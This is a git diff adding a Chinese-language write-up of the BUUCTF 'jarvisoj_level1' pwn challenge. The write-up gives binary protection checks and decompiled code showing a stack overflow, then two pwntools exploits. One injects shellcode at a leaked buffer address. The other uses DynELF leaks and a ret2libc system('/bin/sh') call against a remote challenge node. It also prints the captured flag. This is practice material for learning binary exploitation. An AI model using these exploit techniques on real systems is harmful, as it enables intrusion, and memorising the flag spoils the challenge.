@@ -787,6 +787,99 @@ io.interactive()
 
 ------
 
+### [jarvisoj_level1](https://buuoj.cn/challenges#jarvisoj_level1)
+
+先`file ./level1`查看文件类型再`checksec --file=./level1`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ file ./level1
+./level1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7d479bd8046d018bbb3829ab97f6196c0238b344, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ checksec --file=./level1
+[*] '/home/tyd/ctf/pwn/buuctf/level1'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+```
+
+用`IDA Pro 32bit`打开附件`level1`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  vulnerable_function();
+  write(1, "Hello, World!\n", 0xEu);
+  return 0;
+}
+```
+
+双击`vulnerable_function()`函数查看详情，可以看到该函数中有一个`char`型局部变量`buf`，其可用栈大小为`0x88`，但是`read()`函数限制从`stdin`中读入到`buf`的字节大小为`0x100`，显然存在栈溢出漏洞。此外，`printf`函数会直接将变量`buf`的地址泄露出来。
+
+```c
+ssize_t vulnerable_function()
+{
+  char buf[136]; // [esp+0h] [ebp-88h] BYREF
+  printf("What's this:%p?\n", buf);
+  return read(0, buf, 0x100u);
+}
+```
+
+我们先截取`printf`函数打印出来的`buf`变量地址，在`buf`地址写入`shellcode`后，利用栈溢出漏洞覆盖`vulnerable_function()`函数返回地址，劫持程序去执行写入的`shellcode`。结果我吐了，本地能打通，靶机打不通。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = process('./level1')
+# io = remote('node4.buuoj.cn', 25155)
+io.recvuntil(b"What's this:")
+buf_addr = int(io.recv()[2:-2], 16)
+log.info('buf_addr: %#x', buf_addr)
+shellcode = asm(shellcraft.sh())
+payload = shellcode + b'a' * (0x88+0x4-len(shellcode)) + p32(buf_addr)
+io.sendline(payload)
+io.interactive()
+```
+
+`DynELF`函数能通过已知函数迅速查找`libc`库，并不需要我们知道`libc`文件的版本，也不像使用`LibcSearcher`那样需要选择`libc`的版本。`DynELF`函数的使用前提是程序中存在可以泄露libc信息的漏洞，并且漏洞可以被反复触发。我们利用`DynELF`函数泄露出`system`函数的地址后，还需要知道`/bin/sh`的地址，可以利用`read`函数把`/bin/sh`读入到程序的`.bss`段中，然后通过`system`函数调用即可得到靶机的`shell`。编写`Python`代码求解可得`flag{24430808-9b8d-4a29-bd1e-e3b9df054dfb}`。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 25155)
+elf = ELF('./level1')
+main_addr = elf.symbols['main']
+write_plt = elf.plt['write']
+read_plt = elf.plt['read']
+bss_addr = elf.bss()
+
+def leak(address):
+    payload = b'a'*(0x88+0x4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(address) + p32(4)
+    io.sendline(payload)
+    leaked = io.recv(4)
+    log.info("[%#x] => %s = %s" % (address, repr(leaked), hex(u32(leaked))))
+    return leaked
+
+
+libc = DynELF(leak, elf=elf)
+system_addr = libc.lookup('system', 'libc')
+log.success('system_address => %#x' % system_addr)
+payload = b'a'*(0x88+0x4) + p32(read_plt) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)
+io.send(payload)
+io.send('/bin/sh\x00')
+payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(main_addr) + p32(bss_addr)
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
 ### [jarvisoj_level2](https://buuoj.cn/challenges#jarvisoj_level2)
 
 先`file ./level2`查看文件类型再`checksec --file=./level2`检查文件保护情况。
@@ -2304,8 +2397,8 @@ def leak(address):
     return leaked
 
 
-d = DynELF(leak, elf=elf)
-system_addr = d.lookup('system', 'libc')
+libc = DynELF(leak, elf=elf)
+system_addr = libc.lookup('system', 'libc')
 log.success('system_address => %#x' % system_addr)
 payload = padding + p32(read_plt) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)
 io.send(payload)
